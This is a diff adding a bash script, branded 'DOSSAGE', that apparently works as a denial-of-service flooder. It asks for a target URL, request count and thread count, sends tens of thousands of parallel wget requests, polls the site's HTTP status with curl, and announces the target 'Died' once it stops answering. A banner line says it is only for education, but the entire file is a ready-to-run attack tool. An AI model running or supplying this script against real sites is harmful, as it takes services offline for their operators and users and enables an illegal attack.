@@ -1,0 +1,85 @@
+#!/bin/bash
+
+COUNT=0
+COUNT2=0
+Dr=80000
+Dt=25
+Y="\033[33m"
+U="\033[4m"
+R="\033[31m"
+G="\033[32m"
+SB="\033[36;1m"
+N="\033[0m"
+GR="\033[2m"
+clear;sleep 1;printf "${R}
+╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗
+╚╗╔╗║║╔═╗║║╔═╗║║╔═╗║║╔═╗║║╔═╗║║╔══╝
+─║║║║║║─║║║╚══╗║╚══╗║║─║║║║─╚╝║╚══╗
+─║║║║║║─║║╚══╗║╚══╗║║╚═╝║║║╔═╗║╔══╝
+╔╝╚╝║║╚═╝║║╚═╝║║╚═╝║║╔═╗║║╚╩═║║╚══╗    ${N}${GR}┌∩┐(◣_◢)┌∩┐${N}${R}
+╚═══╝╚═══╝╚═══╝╚═══╝╚╝─╚╝╚═══╝╚═══╝  ${N}(${GR}@Black-widow-z${N})\n
+
+(${R}*${N}) Only for education purpose.
+(${R}*${N}) Don't do any illegal Activity.
+
+${GR}[Enter]to continue.......${N}" & read confrim
+
+
+# Inputs
+printf "\n${Y}Target${N}: " &read TARGET
+printf "${Y}No.of.Request(${N}$Dr${Y})${N}: " &read REQ
+printf "${Y}No.of.Threads(${N}$Dt${Y})${N}: " &read THREAD
+
+# Checking conditions
+if [ $TARGET = $None ] 2>/dev/null;then
+	printf "\n(${R}!${N})Target required\n";exit 1
+fi
+if [ $REQ = $None ] 2>/dev/null;then REQ=$Dr;fi
+if [ $REQ -eq $REQ ] 2>/dev/null;then printf ""
+else
+	printf "\n(${R}!${N})Integer required\n";exit 1
+fi
+if [ $THREAD = $None ] 2>/dev/null;then THREAD=$Dt;fi
+if [ $THREAD -eq $THREAD ] 2>/dev/null;then printf ""
+else
+	printf "\n(${R}!${N})Thread Must be in integer\n";exit 1
+fi
+printf "
+(${R}Target${N})   : ${U}%-${#TARGET}s${N} (${R}Thread${N})   : $THREAD
+(${R}Request${N})  : %-${#TARGET}s (${R}Status${N})   : " "$TARGET" "$REQ"
+
+#ping Test
+wget -q --spider $TARGET 2>/dev/null
+if [ $? -eq 0 ];then printf "(${G}up${N})\n";else	printf "(${R}down${N})\n";exit 1;fi
+
+Req(){ 
+	$(wget -q --spider $TARGET)
+}
+
+Per(){
+	awk "BEGIN { print "$*" }"
+}
+Bust(){
+	printf "\n\n
+${SB}${R}╔══╗${N}${GR}─${N}${SB}╔═══╗╔═══╗${R}╔═╗╔═╗
+${R}║╔╗║${N}${GR}─${N}${SB}║╔═╗║║╔═╗║${R}║║╚╝║║
+${R}║╚╝╚╗${SB}║║${N}${GR}─${N}${SB}║║║║${N}${GR}─${N}${SB}║║${R}║╔╗╔╗║
+${R}║╔═╗║${SB}║║${N}${GR}─${N}${SB}║║║║${N}${GR}─${N}${SB}║║${R}║║║║║║
+${R}║╚═╝║${SB}║╚═╝║║╚═╝║${R}║║║║║║
+${R}╚═══╝${SB}╚═══╝╚═══╝${R}╚╝╚╝╚╝${N}\n\n"
+printf "${G}your Target(${N}${GR}$TARGET${N}${G}) Died in ${U}$COUNT2${N} Request (${R}%.f%%${N}).\n" "$(Per $COUNT2/$REQ*100)";exit 1
+}
+Check(){
+	urlstatus=$(curl -o /dev/null --silent --head --write-out '%{http_code}' "$TARGET")
+	if [ $urlstatus -eq 200 ];then printf "";else Bust;fi
+}
+
+for i in $(seq 1 $REQ);do
+	Req&
+	if [ $COUNT -eq $THREAD ];then wait -n 1;COUNT=$(($COUNT - 1));fi
+	COUNT=$(($COUNT + 1));COUNT2=$(($COUNT2 + 1));COUNT3=$(($COUNT3 + 1))
+	if [ $COUNT3 -eq 329 ];then Check;COUNT3=0;fi
+	printf "(${R}Remaining${N}): %-${#TARGET}s (${R}Received${N}) : %-${#REQ}s\r" "$(($REQ - $COUNT2))" "$COUNT2"
+done
+printf "\n\n${Y}Oops!${N}${G},Your target (${N}${GR}$TARGET${N}${G}) still alive.\n"
+
